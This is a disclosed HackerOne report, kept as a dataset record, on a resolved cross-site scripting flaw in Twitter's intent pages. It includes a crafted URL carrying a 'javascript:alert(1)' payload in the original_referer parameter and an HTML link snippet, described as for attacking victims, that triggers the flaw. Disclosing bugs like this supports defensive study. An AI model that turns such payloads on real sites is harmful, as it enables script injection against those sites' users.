---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '50134'
original_report_id: '50134'
title: XSS in original referrer after follow
weakness: Cross-site Scripting (XSS) - Generic
team_handle: x
created_at: '2015-03-05T11:34:49.909Z'
disclosed_at: '2015-03-09T18:37:58.303Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in original referrer after follow

## Metadata

- HackerOne Report ID: 50134
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: x
- Disclosed At: 2015-03-09T18:37:58.303Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Hey hi,**

There is a XSS in the intent functionality , 

Steps to reproduce
=======================

1)  copy paste the following Link 
https://twitter.com/intent/favorite/complete?tweet_id=572435913768366080&already_favorited=false&original_referer=javascript:alert%281%29;

2) Click follow 

3) now click return to previous site, you will see a xss triggered.

Requirements
====================
- Make sure you pick a tweet of a user , that you don't follow.
- to execute you need to send a null referrer.

Here is the html code to attack victims
=====================================
`<html>
<a href="https://twitter.com/intent/favorite/complete?tweet_id=572435913768366080&already_favorited=false&original_referer=javascript:alert%281%29;
" rel="noreferrer">click here and follow</a>
</html>`

**a rel=noreferrer will do our work.**

**Regards
Wesecureapp**

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
